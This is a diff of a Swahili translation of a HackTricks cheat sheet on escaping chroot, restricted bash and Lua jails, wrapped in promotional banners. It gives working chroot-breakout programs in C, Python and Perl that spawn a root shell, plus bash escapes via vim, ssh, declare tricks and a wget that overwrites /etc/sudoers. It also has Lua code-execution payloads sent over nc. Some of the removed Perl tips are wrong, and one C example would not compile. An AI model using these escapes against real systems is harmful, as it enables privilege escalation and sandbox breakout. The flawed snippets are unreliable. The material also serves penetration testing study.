@@ -1,58 +1,68 @@
-# Escaping from Jails
+# Kutoroka Kutoka Jela
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
 ## **GTFOBins**
 
-**Tafuta kwenye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **kama unaweza kutekeleza faili yoyote na sifa ya "Shell"**
+**Tafuta kwenye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ikiwa unaweza kutekeleza binary yoyote na mali ya "Shell"**
 
-## Kutoroka Kutoka Chroot
+## Kutoroka kwa Chroot
 
-Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot **haukusudiwi kulinda** dhidi ya kuingiliwa kwa makusudi na watumiaji wenye **mamlaka** (**root**). Kwenye mifumo mingi, muktadha wa chroot hauna uwezo wa kushughulikia vizuri na programu zilizofungwa kwenye chroot **zinazoweza kufanya chroot ya pili kuvunja**.\
-Kawaida hii inamaanisha kuwa ili kutoroka, unahitaji kuwa root ndani ya chroot.
+Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot **haukusudiwi kulinda** dhidi ya kuharibiwa kwa makusudi na watumiaji wenye **mamlaka** (**root**). Kwenye mifumo mingi, muktadha wa chroot hauwezi kustack vizuri na programu zilizochrooted **zenye mamlaka ya kutosha zinaweza kufanya chroot ya pili kuvunja**.\
+Kawaida hii inamaanisha kwamba ili kutoroka unahitaji kuwa root ndani ya chroot.
 
 {% hint style="success" %}
-**Zana** [**chw00t**](https://github.com/earthquake/chw00t) iliumbwa ili kutumia mazingira yafuatayo na kutoroka kutoka `chroot`.
+**Zana** [**chw00t**](https://github.com/earthquake/chw00t) ilitengenezwa kwa kudhuru mazingira yafuatayo na kutoroka kutoka `chroot`.
 {% endhint %}
 
 ### Root + CWD
 
 {% hint style="warning" %}
-Ikiwa wewe ni **root** ndani ya chroot unaweza **kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot 2 haziwezi kuwepo (katika Linux), kwa hivyo ikiwa unatengeneza saraka na kisha **kuunda chroot mpya** kwenye saraka hiyo mpya ukiwa **nje yake**, sasa utakuwa **nje ya chroot mpya** na kwa hivyo utakuwa kwenye FS.
+Ikiwa wewe ni **root** ndani ya chroot unaweza **kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot 2 haziwezi kuwepo pamoja (kwenye Linux), hivyo ikiwa unajenga folda na kisha **kuunda chroot mpya** kwenye folda hiyo mpya ukiwa **nje yake**, sasa utakuwa **nje ya chroot mpya** na hivyo utakuwa kwenye FS.
 
-Hii hutokea kwa sababu kawaida chroot HAIHAMISHI saraka yako ya kazi kwenye ile iliyotajwa, kwa hivyo unaweza kuunda chroot lakini uwe nje yake.
+Hii hutokea kwa sababu kawaida chroot HAIHAMISHI saraka yako ya kufanyia kazi kwenye ile iliyoelekezwa, hivyo unaweza kuunda chroot lakini uwe nje yake.
 {% endhint %}
 
-Kawaida hutapata faili ya `chroot` ndani ya jela ya chroot, lakini **unaweza kusanidi, kupakia na kutekeleza** faili ya binary:
+Kawaida hutapata binary ya `chroot` ndani ya jela ya chroot, lakini **unaweza kuchanganya, kupakia na kutekeleza** binary: 
 
 <details>
 
 <summary>C: break_chroot.c</summary>
+```c
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <unistd.h>
 
-\`\`\`c #include #include #include
+//gcc break_chroot.c -o break_chroot
 
-//gcc break\_chroot.c -o break\_chroot
-
-int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }
-
-````
+int main(void)
+{
+mkdir("chroot-dir", 0755);
+chroot("chroot-dir");
+for(int i = 0; i < 1000; i++) {
+chdir("..");
+}
+chroot(".");
+system("/bin/bash");
+}
+```
 </details>
 
 <details>
 
-<summary>Python</summary>
+<summary>Kipanya</summary>
 ```python
 #!/usr/bin/python
 import os
@@ -62,42 +72,12 @@ for i in range(1000):
 os.chdir("..")
 os.chroot(".")
 os.system("/bin/bash")
-````
-
+```
 </details>
 
 <details>
 
 <summary>Perl</summary>
-
-Perl ni lugha ya programu ambayo inaweza kutumika kwa kusudi la kutoroka kutoka kwenye mazingira ya bash iliyopunguzwa. Hapa kuna njia kadhaa za kufanya hivyo:
-
-1. Kutumia Perl kwa kutekeleza amri za shell:
-
-```perl
-perl -e 'exec "/bin/sh";'
-```
-
-2. Kutumia Perl kwa kutekeleza amri za shell kwa kutumia mchanganyiko wa amri za Perl na amri za shell:
-
-```perl
-perl -e 'system("/bin/sh");'
-```
-
-3. Kutumia Perl kwa kutekeleza amri za shell kwa kutumia mchanganyiko wa amri za Perl na amri za shell, na kuficha matokeo:
-
-```perl
-perl -e 'open(STDIN, "/bin/sh");'
-```
-
-4. Kutumia Perl kwa kutekeleza amri za shell kwa kutumia mchanganyiko wa amri za Perl na amri za shell, na kuficha matokeo na kuingiza amri za shell ndani ya programu ya Perl:
-
-```perl
-perl -e '$0="/bin/sh";'
-```
-
-Kwa kutumia njia hizi, unaweza kutoroka kutoka kwenye mazingira ya bash iliyopunguzwa na kupata ufikiaji wa juu zaidi.
-
 ```perl
 #!/usr/bin/perl
 mkdir "chroot-dir";
@@ -108,86 +88,87 @@ chdir ".."
 chroot ".";
 system("/bin/bash");
 ```
-
 </details>
 
-### Mzizi + FD iliyohifadhiwa
+### Root + Saved fd
 
 {% hint style="warning" %}
-Hii ni sawa na kesi iliyotangulia, lakini katika kesi hii **mshambuliaji anahifadhi faili descriptor kwa saraka ya sasa** na kisha **anajenga chroot katika saraka mpya**. Hatimaye, kwa kuwa ana **upatikanaji** wa **FD** hiyo **nje** ya chroot, anaiingia na **kutoroka**.
+Hii ni sawa na kesi iliyopita, lakini katika kesi hii **mshambuliaji hifadhi file descriptor kwa saraka ya sasa** na kisha **anajenga chroot katika saraka mpya**. Hatimaye, kwa kuwa ana **upatikanaji** wa **FD** **nje** ya chroot, anapata na **kutoroka**.
 {% endhint %}
 
 <details>
 
 <summary>C: break_chroot.c</summary>
+```c
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <unistd.h>
 
-\`\`\`c #include #include #include
+//gcc break_chroot.c -o break_chroot
 
-//gcc break\_chroot.c -o break\_chroot
-
-int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }
-
-````
+int main(void)
+{
+mkdir("tmpdir", 0755);
+dir_fd = open(".", O_RDONLY);
+if(chroot("tmpdir")){
+perror("chroot");
+}
+fchdir(dir_fd);
+close(dir_fd);
+for(x = 0; x < 1000; x++) chdir("..");
+chroot(".");
+}
+```
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
-<div data-gb-custom-block data-tag="hint" data-style='warning'>
-
-FD inaweza kupitishwa kupitia Unix Domain Sockets, hivyo:
+{% hint style="warning" %}
+FD inaweza kupitishwa juu ya Unix Domain Sockets, hivyo:
 
 * Unda mchakato wa mtoto (fork)
-* Unda UDS ili mzazi na mtoto waweze kuongea
-* Chalisha chroot katika mchakato wa mtoto katika saraka tofauti
-* Katika mzazi proc, unda FD ya saraka ambayo iko nje ya chroot mpya ya mtoto
-* Pita kwa mtoto procc FD hiyo kwa kutumia UDS
-* Mtoto mchakato chdir kwa FD hiyo, na kwa sababu iko nje ya chroot yake, atatoka gerezani
+* Unda UDS ili mzazi na mtoto waweze kuzungumza
+* Endesha chroot katika mchakato wa mtoto katika saraka tofauti
+* Katika mchakato wa mzazi, unda FD ya saraka ambayo iko nje ya chroot mpya ya mchakato wa mtoto
+* Pita kwa mtoto FD hiyo kutumia UDS
+* Mchakato wa mtoto chdir kwa FD hiyo, na kwa sababu iko nje ya chroot yake, atatoka gerezani
+{% endhint %}
 
-</div>
+### Root + Mount
 
-### &#x20;Root + Mount
-
-<div data-gb-custom-block data-tag="hint" data-style='warning'>
-
-* Kufunga kifaa cha mizizi (/) katika saraka ndani ya chroot
-* Kufunga katika saraka hiyo
+{% hint style="warning" %}
+* Kufunga kifaa cha mzizi (/) ndani ya saraka ndani ya chroot
+* Kuingia chroot katika saraka hiyo
 
 Hii inawezekana katika Linux
-
-</div>
+{% endhint %}
 
 ### Root + /proc
 
-<div data-gb-custom-block data-tag="hint" data-style='warning'>
-
-* Funga procfs katika saraka ndani ya chroot (ikiwa bado haijafungwa)
-* Tafuta pid ambayo inaingia tofauti ya mizizi/cwd, kama: /proc/1/root
+{% hint style="warning" %}
+* Funga procfs ndani ya saraka ndani ya chroot (ikiwa bado haijafanyika)
+* Tafuta pid ambayo inaingia tofauti ya mzizi/cwd, kama: /proc/1/root
 * Chroot katika kuingia hiyo
-
-</div>
+{% endhint %}
 
 ### Root(?) + Fork
 
-<div data-gb-custom-block data-tag="hint" data-style='warning'>
-
-* Unda Fork (mtoto proc) na chroot katika saraka tofauti zaidi katika FS na CD juu yake
-* Kutoka kwa mchakato wa mzazi, hamisha saraka ambapo mchakato wa mtoto iko katika saraka kabla ya chroot ya watoto
-* Mchakato huu wa watoto atajikuta nje ya chroot
-
-</div>
+{% hint style="warning" %}
+* Unda Fork (mchakato wa mtoto) na chroot katika saraka tofauti zaidi katika FS na CD juu yake
+* Kutoka kwa mchakato wa mzazi, hamisha saraka ambapo mchakato wa mtoto yuko katika saraka kabla ya chroot ya watoto
+* Mchakato hawa watoto watapata wenyewe nje ya chroot
+{% endhint %}
 
 ### ptrace
 
-<div data-gb-custom-block data-tag="hint" data-style='warning'>
-
-* Muda uliopita watumiaji wangeweza kudebugi michakato yao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii haiwezekani kwa chaguo-msingi tena
-* Hata hivyo, ikiwa inawezekana, unaweza kufuatilia mchakato na kutekeleza shellcode ndani yake ([angalia mfano huu](linux-capabilities.md#cap\_sys\_ptrace)).
-
-</div>
+{% hint style="warning" %}
+* Zamani watumiaji wangeweza kudebugi michakato yao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii sio inawezekana kwa chaguo-msingi tena
+* Hata hivyo, ikiwa inawezekana, unaweza ptrace katika mchakato na kutekeleza shellcode ndani yake ([angalia mfano huu](linux-capabilities.md#cap\_sys\_ptrace)).
+{% endhint %}
 
 ## Bash Jails
 
-### Uchunguzi
+### Uchambuzi
 
 Pata habari kuhusu gereza:
 ```bash
@@ -196,118 +177,84 @@ echo $PATH
 env
 export
 pwd
-````
+```
+### Badilisha PATH
 
-#### Badilisha NJIA
-
-Angalia ikiwa unaweza kubadilisha kipengele cha mazingira cha NJIA (PATH)
-
+Angalia kama unaweza kubadilisha mazingira ya PATH
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-
-#### Kutumia vim
-
-Vim ni mhariri wa maandishi unaopatikana kwenye mifumo mingi ya Linux. Inaweza kutumiwa kwa ufanisi katika kutoroka kutoka kwenye mazingira ya bash yaliyopunguzwa. Hapa kuna hatua za kufuata:
-
-1. Fungua terminal na uingie kwenye akaunti ya mtumiaji mdogo.
-2. Chukua jina la faili la kikao cha bash kilichopunguzwa na uandike kwenye kumbukumbu.
-3. Tumia amri `vim` kufungua mhariri wa vim.
-4. Ndani ya vim, bonyeza `:` kuingia kwenye mode ya amri.
-5. Andika `set shell=/bin/bash` na bonyeza Enter ili kuweka shell ya vim kuwa bash.
-6. Kisha andika `shell` na bonyeza Enter ili kutekeleza amri ya shell.
-7. Utakuwa sasa umepata shell ya bash iliyopanuliwa na uwezo wa kutekeleza amri zote za bash.
-
-Kwa kufuata hatua hizi, unaweza kutumia vim kutoroka kutoka kwenye mazingira ya bash yaliyopunguzwa na kupata ufikiaji wa juu wa mifumo ya Linux.
-
+### Kutumia vim
 ```bash
 :set shell=/bin/sh
 :shell
 ```
+### Unda skripti
 
-#### Unda skripti
-
-Angalia kama unaweza kuunda faili inayoweza kutekelezwa na maudhui ya _/bin/bash_
-
+Angalia kama unaweza kuunda faili inayoweza kutekelezwa na _/bin/bash_ kama yaliyomo
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
+### Pata bash kutoka SSH
 
-#### Pata bash kutoka kwa SSH
-
-Ikiwa unatumia ssh, unaweza kutumia hila hii ili kutekeleza kikasha cha bash:
-
+Ikiwa unatumia ssh unaweza kutumia hila hii kutekeleza bash shell:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-
-#### Tangaza
-
-Kuweka mazingira salama kwenye mfumo wa Linux ni muhimu sana ili kuzuia watu wasiohitajika kufikia rasilimali zako za mtandao. Hata hivyo, kuna njia ambazo mtu anaweza kutumia kuvunja vizuizi na kupata ufikiaji wa kiwango cha juu kwenye mfumo wako. Mbinu hii inajulikana kama "kupanda kutoka kwenye Bash iliyopunguzwa".
-
-Kwa kawaida, wakati mtumiaji anapokuwa amepunguzwa kwenye Bash iliyopunguzwa, kuna vizuizi kadhaa ambavyo vinazuia ufikiaji wa kiwango cha juu. Hata hivyo, kuna njia kadhaa za kuzunguka vizuizi hivi na kupata ufikiaji wa kiwango cha juu.
-
-Moja ya njia hizo ni kwa kutumia mbinu ya "kupanda kutoka kwenye Bash iliyopunguzwa" ambayo inahusisha kutumia mbinu za kubadilisha mazingira ya Bash ili kuondoa vizuizi na kupata ufikiaji wa kiwango cha juu.
-
-Kuna njia kadhaa za kufanya hivyo, ikiwa ni pamoja na kubadilisha PATH, kubadilisha SHELL, kubadilisha LD\_PRELOAD, na kutumia mbinu za kubadilisha mazingira ya Bash.
-
-Ni muhimu kuelewa kwamba mbinu hizi zinaweza kuwa hatari na zinapaswa kutumiwa tu kwa madhumuni ya kujifunza au kwa idhini ya mmiliki wa mfumo. Kwa kuongezea, ni muhimu kufuata sheria na kanuni zote zinazohusiana na usalama wa mtandao wakati wa kufanya mbinu hizi.
-
+### Tangaza
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
+### Wget
 
-#### Wget
-
-Unaweza kubadilisha faili ya sudoers kwa mfano
-
+Unaweza kubadilisha mfano faili ya sudoers
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-
-#### Mbinu nyingine
+### Mbinu Nyingine
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
-**Pia inaweza kuwa ya kuvutia ukurasa huu:**
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io)\
+**Pia inaweza kuwa ya kuvutia ukurasa:**
 
-### Jela za Python
+{% content-ref url="../bypass-bash-restrictions/" %}
+[bypass-bash-restrictions](../bypass-bash-restrictions/)
+{% endcontent-ref %}
+
+## Python Jails
 
 Mbinu za kutoroka kutoka kwa jela za python zinapatikana kwenye ukurasa ufuatao:
 
-### Jela za Lua
+{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
+[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
+{% endcontent-ref %}
 
-Kwenye ukurasa huu unaweza kupata kazi za jumla ambazo unaweza kuzitumia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
+## Lua Jails
+
+Kwenye ukurasa huu unaweza kupata kazi za jumla unazo ufikia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **Eval na utekelezaji wa amri:**
-
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-
-Baadhi ya mbinu za **kuita kazi za maktaba bila kutumia alama za nukta**:
-
+Baadhi ya mbinu za **kuita kazi za maktaba bila kutumia alama za mshono**:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-
 Panga kazi za maktaba:
-
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-
-Tafadhali kumbuka kuwa kila wakati unapotekeleza amri ya awali katika **mazingira tofauti ya lua, utaratibu wa kazi hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza kazi fulani maalum, unaweza kufanya shambulio la nguvu kwa kupakia mazingira tofauti ya lua na kuita kazi ya kwanza ya maktaba ya le:
-
+Tafadhali kumbuka kila unapotekeleza amri ya mstari mmoja iliyotangulia katika **mazingira tofauti ya lua, mpangilio wa kazi hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza kazi moja maalum unaweza kufanya shambulio la nguvu kwa kupakia mazingira tofauti ya lua na kuita kazi ya kwanza ya maktaba:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -318,17 +265,24 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-
-**Pata kikao cha lua cha kuingiliana**: Ikiwa uko ndani ya kikao cha lua kilichopunguzwa, unaweza kupata kikao kipya cha lua (na matumaini yasiyokuwa na kikomo) kwa kuita:
-
+**Pata ganda la lua la kuingiliana**: Ikiwa uko ndani ya ganda la lua lililopunguzwa unaweza kupata ganda jipya la lua (na kwa matumaini lisilopunguzwa) kwa kuita:
 ```bash
 debug.debug()
 ```
+## Marejeo
 
-### Marejeo
+* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Majadiliano: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
-* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Majedwali: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
+<details>
 
+<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
+Njia nyingine za kusaidia HackTricks:
+
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
